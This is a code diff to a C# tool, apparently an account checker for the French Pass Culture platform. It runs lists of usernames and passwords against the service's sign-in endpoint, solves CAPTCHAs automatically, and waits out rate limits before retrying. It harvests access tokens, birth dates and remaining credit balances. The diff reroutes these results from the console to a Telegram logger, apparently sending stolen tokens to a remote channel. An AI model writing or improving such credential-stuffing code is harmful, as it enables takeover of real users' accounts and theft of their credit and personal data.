@@ -30,7 +30,7 @@ namespace DataVortex
             if (IsAccountVerified(account.username))
             {
                 Console.ForegroundColor = ConsoleColor.Magenta;
-                Console.WriteLine("Ce compte a déjà été vérifié. Ignoré.");
+                Telegram.LogMessage("Ce compte a déjà été vérifié. Ignoré.");
                 Console.ResetColor();
                 return;
             }
@@ -89,11 +89,10 @@ namespace DataVortex
                 // Write the unique lines back to the file
                 File.WriteAllLines(filePath, uniqueLines);
 
-                Console.WriteLine("Duplicates removed successfully.");
             }
             catch (Exception ex)
             {
-                Console.WriteLine($"An error occurred: {ex.Message}");
+                Telegram.LogMessage($"An error occurred: {ex.Message}");
             }
         }
 
@@ -103,13 +102,13 @@ namespace DataVortex
             if (IsAccountVerified(username))
             {
                 Console.ForegroundColor = ConsoleColor.Magenta;
-                Console.WriteLine("Ce compte a déjà été vérifié. Ignoré.");
+                Telegram.LogMessage("Ce compte a déjà été vérifié. Ignoré.");
                 Console.ResetColor();
                 return;
             }
 
-            Console.Write("Captcha en cours");
-            Console.WriteLine(" ");
+            Telegram.LogMessage("Captcha en cours");
+            Telegram.LogMessage(" ");
             ReCaptchaV2Example.SolveCaptcha();
             string captchaCode = ReCaptchaV2Example.CaptchaCode;
             var url = "https://backend.passculture.app/native/v1/signin";
@@ -137,7 +136,7 @@ namespace DataVortex
                     {
                         var accountState = jsonResponse["accountState"].ToString();
                         Console.ForegroundColor = ConsoleColor.Yellow;
-                        Console.WriteLine($"accountState: {accountState}");
+                        Telegram.LogMessage($"accountState: {accountState}");
                         Console.ResetColor();
 
                         if (accountState != "ACTIVE")
@@ -149,14 +148,14 @@ namespace DataVortex
                     if (jsonResponse.ContainsKey("code") && jsonResponse["code"].ToString() == "EMAIL_NOT_VALIDATED")
                     {
                         HandleIncorrectAccount(username, password);
-                        Console.WriteLine("L'email n'a pas été validé. Ajout dans la liste incorrect.");
+                        Telegram.LogMessage("L'email n'a pas été validé. Ajout dans la liste incorrect.");
                     }
 
                     if (httpResponse.StatusCode == HttpStatusCode.BadRequest)
                     {
                         HandleIncorrectAccount(username, password);
                         Console.ForegroundColor = ConsoleColor.Red;
-                        Console.WriteLine("Erreur 400 : Mot de passe incorrect.");
+                        Telegram.LogMessage("Erreur 400 : Mot de passe incorrect.");
                         Console.ResetColor();
                     }
 
@@ -177,7 +176,7 @@ namespace DataVortex
         {
             var accessToken = jsonResponse["accessToken"].ToString();
             Console.ForegroundColor = ConsoleColor.Yellow;
-            Console.WriteLine($"accessToken: {accessToken}");
+            Telegram.LogMessage($"accessToken: {accessToken}");
             Console.ResetColor();
 
             var url3 = "https://backend.passculture.app/native/v1/me";
@@ -194,7 +193,7 @@ namespace DataVortex
                 {
                     BirthDate = jsonResponse3["birthDate"].ToString();
                     Console.ForegroundColor = ConsoleColor.Yellow;
-                    Console.WriteLine($"birthDate: {BirthDate}");
+                    Telegram.LogMessage($"birthDate: {BirthDate}");
                     Console.ResetColor();
                 }
 
@@ -221,7 +220,7 @@ namespace DataVortex
                             var remaining = allCredit["remaining"].ToObject<int>();
                             Remaining1 = (double)remaining / 100.0;
                             Console.ForegroundColor = ConsoleColor.Yellow;
-                            Console.WriteLine($"Remaining1: {Remaining1}");
+                            Telegram.LogMessage($"Remaining1: {Remaining1}");
                             Console.ResetColor();
                         }
                     }
@@ -259,7 +258,7 @@ namespace DataVortex
         private static void HandleNonEligibleAccount(string username, string password)
         {
             // Faire quelque chose si le statut est "non_eligible"
-            Console.WriteLine("L'utilisateur n'est pas éligible.");
+            Telegram.LogMessage("L'utilisateur n'est pas éligible.");
             HandleIncorrectAccount(username, password);
         }
 
@@ -271,13 +270,13 @@ namespace DataVortex
                 {
                     HandleIncorrectAccount(username, password);
                     Console.ForegroundColor = ConsoleColor.Green;
-                    Console.WriteLine("Erreur 400 : Mot de passe incorrect.");
+                    Telegram.LogMessage("Erreur 400 : Mot de passe incorrect.");
                     Console.ResetColor();
                 }
                 else if (errorResponse.StatusCode == (HttpStatusCode)429)
                 {
                     Console.ForegroundColor = ConsoleColor.Red;
-                    Console.WriteLine("Erreur 429 : Rate limit atteint. Prochaine tentative dans 5 minute.");
+                    Telegram.LogMessage("Erreur 429 : Rate limit atteint. Prochaine tentative dans 5 minute.");
                     Console.ResetColor();
                     Task.Delay(300000).Wait(); // Attendez 5 minutes (300000 millisecondes) avant de réessayer.
                     CheckPassCultureAsync(username, password).Wait(); // Réessayez après l'attente.
